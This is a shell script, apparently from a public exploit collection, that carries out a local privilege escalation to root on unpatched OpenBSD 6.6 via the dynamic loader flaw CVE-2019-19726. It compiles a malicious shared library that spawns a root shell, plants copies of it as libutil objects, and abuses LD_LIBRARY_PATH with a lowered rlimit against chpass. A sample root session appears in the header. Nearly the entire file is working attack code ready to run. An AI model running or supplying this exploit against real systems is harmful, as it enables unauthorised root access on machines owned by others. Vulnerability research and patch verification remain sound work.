#!/bin/sh
# openbsd-dynamic-loader-chpass - OpenBSD local root exploit for 2019-19726
# Code mostly stolen from Qualys PoCs:
# - https://www.openwall.com/lists/oss-security/2019/12/11/9
# - https://blog.qualys.com/laws-of-vulnerabilities/2019/12/11/openbsd-local-privilege-escalation-vulnerability-cve-2019-19726
# - https://www.qualys.com/2019/12/11/cve-2019-19726/local-privilege-escalation-openbsd-dynamic-loader.txt
#
# This exploit uses the lazy approach of spraying libutil shared objects
# to the current working directory.
# ---
# openbsd-6-6-x64$ ./openbsd-dynamic-loader-chpass  
# openbsd-dynamic-loader-chpass (CVE-2019-19726)
# [*] id: uid=1001(test) gid=1001(test) groups=1001(test)
# [*] checking system ...
# [*] current directory /home/test is writable
# [*] 013_ldso patch has not been installed
# [*] compiling ...
# [*] spraying libutil shared objects ...
# [*] executing ./poc /usr/bin/chpass ...
# openbsd-6-6-x64# id
# uid=0(root) gid=0(wheel) groups=1001(test)
# openbsd-6-6-x64# uname -a
# OpenBSD openbsd-6-6-x64.localdomain 6.6 GENERIC#353 amd64
# openbsd-6-6-x64# ld --version
# LLD 8.0.1 (compatible with GNU linkers)
# openbsd-6-6-x64# ^D
# chpass: /etc/master.passwd: unchanged
# [*] cleaning up ...
# ---
# 2019-12-15 - <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/CVE-2019-19726

chpass="/usr/bin/chpass"

echo "openbsd-dynamic-loader-chpass (CVE-2019-19726)"

echo "[*] id: `id`"

echo "[*] checking system ..."

if [ -w . ]; then
  echo "[*] current directory `pwd` is writable"
else
  echo "[-] current directory `pwd` is not writable"
  exit 1
fi

if syspatch -l | grep -q 013_ldso ; then
  echo "[-] 013_ldso patch has been installed"
  exit 1
else
  echo "[*] 013_ldso patch has not been installed"
fi

echo "[*] compiling ..."

cat > lib.c << "EOF"
#include <paths.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    if (setuid(0) != 0) _exit(__LINE__);
    if (setgid(0) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, "-c", _PATH_KSHELL "; exit 1", NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

cc -fpic -shared -s -o lib.o lib.c -Wall

cat > poc.c << "EOF"
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <unistd.h>

int
main(int argc, char * const * argv)
{
    #define LLP "LD_LIBRARY_PATH=."
    static char llp[ARG_MAX - 128];
    memset(llp, ':', sizeof(llp)-1);
    memcpy(llp, LLP, sizeof(LLP)-1);
    char * const envp[] = { llp, "EDITOR=echo '#' >>", NULL };

    #define DATA (ARG_MAX * sizeof(char *))
    const struct rlimit data = { DATA, DATA };
    if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);

    if (argc <= 1) _exit(__LINE__);
    argv += 1;
    execve(argv[0], argv, envp);
    _exit(__LINE__);
}
EOF

cc -s -o poc poc.c -Wall

#$ readelf -a /usr/sbin/pwd_mkdb | grep NEEDED
# 0x0000000000000001 (NEEDED)             Shared library: [libutil.so.13.1]
# 0x0000000000000001 (NEEDED)             Shared library: [libc.so.95.1]

echo "[*] spraying libutil shared objects ..."

cp lib.o libutil.so.11.1
cp lib.o libutil.so.12.1
cp lib.o libutil.so.13.1

echo "[*] executing ./poc $chpass ..."

./poc "$chpass"

echo "[*] cleaning up ..."

rm lib.o
rm libutil.so.11.1
rm libutil.so.12.1
rm libutil.so.13.1
rm poc
rm poc.c
rm lib.c
